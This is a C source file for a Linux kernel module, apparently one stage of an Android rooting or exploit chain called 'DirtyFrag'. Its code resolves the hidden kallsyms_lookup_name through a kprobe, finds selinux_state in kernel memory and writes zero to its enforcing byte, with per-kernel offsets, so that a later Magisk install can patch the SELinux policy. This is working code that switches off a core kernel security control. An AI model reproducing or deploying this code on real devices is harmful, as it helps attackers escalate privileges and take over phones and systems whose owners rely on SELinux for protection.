// DirtyFrag module pipeline: the SELinux switch.
//
// The page-cache stub has already run in init. This module does the one
// kernel-side job the chain needs: set selinux_state.enforcing = 0, so the
// userspace Magisk late install can patch the policy (no domain has
// security:security load_policy under Enforcing). Read the address through the
// unexported kallsyms_lookup_name via kprobe, as the reference module.
//
// The byte to clear is a line property, not a per-image guess:
//   - 5.4 keeps an unconditional `bool disabled` first, so `enforcing` is +1
//     even with CONFIG_SECURITY_SELINUX_DISABLE=n (measured on both sampled
//     5.4 Images by disassembly; see docs/analysis/module-single-asset-plan.md).
//   - 5.10+ puts `disabled` behind CONFIG_SECURITY_SELINUX_DISABLE, so
//     `enforcing` is +0 unless that symbol is built in, in which case it is
//     +1. The module resolves `selinux_disable` once and decides.
// `+0` is never written on the gki line: on 6.6/6.12 `enforcing` is at +0 and
// `initialized` at +1, and zeroing `initialized` wrecks the LSM state machine.
//
// The DEVELOP guard is mandatory on every line: `sel_write_enforce` is compiled
// only with CONFIG_SECURITY_SELINUX_DEVELOP and stubbed to NULL otherwise.
// Without it the enforce file is read-only and `enforcing` may not exist; a
// write would land on `checkreqprot` and read back as success -- the class the
// 5.4 pair shipped once.
#ifndef DFSWITCH_LINE
#error "define DFSWITCH_LINE (54 or 510); use build.sh"
#endif
#if DFSWITCH_LINE != 54 && DFSWITCH_LINE != 510
#error "DFSWITCH_LINE must be 54 (the 5.4 family) or 510 (5.10+)"
#endif
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/module.h>

#if DFSWITCH_LINE == 54
#define DFSWITCH_LINE_NAME "5.4"
#else
#define DFSWITCH_LINE_NAME "gki"
#endif

static struct kprobe probe = { .symbol_name = "kallsyms_lookup_name" };

static int __init dfswitch_init(void)
{
	unsigned long (*lookup)(const char *name);
	unsigned long state;
	int offset;
	int ret = register_kprobe(&probe);

	pr_info("DFSWITCH register_kprobe ret=%d addr=%px\n", ret, probe.addr);
	if (ret)
		return ret;
	lookup = (unsigned long (*)(const char *))probe.addr;

	if (!lookup("sel_write_enforce")) {
		pr_info("DFSWITCH sel_write_enforce not found; CONFIG_SECURITY_SELINUX_DEVELOP is off\n");
		unregister_kprobe(&probe);
		return -EOPNOTSUPP;
	}

#if DFSWITCH_LINE == 54
	offset = 1;
#else
	offset = lookup("selinux_disable") ? 1 : 0;
#endif

	state = lookup("selinux_state");
	if (state) {
		volatile unsigned char *enforcing =
			(volatile unsigned char *)state + offset;

		*enforcing = 0;
		pr_info("DFSWITCH selinux_state=%px line=" DFSWITCH_LINE_NAME
			" offset=%d enforcing=%d\n",
			(void *)state, offset, (int)*enforcing);
	} else {
		pr_info("DFSWITCH selinux_state not found\n");
	}
	unregister_kprobe(&probe);
	return state ? 0 : -ENOENT;
}

static void __exit dfswitch_exit(void)
{
	pr_info("DFSWITCH exit\n");
}

module_init(dfswitch_init);
module_exit(dfswitch_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("DirtyFrag SELinux switch");
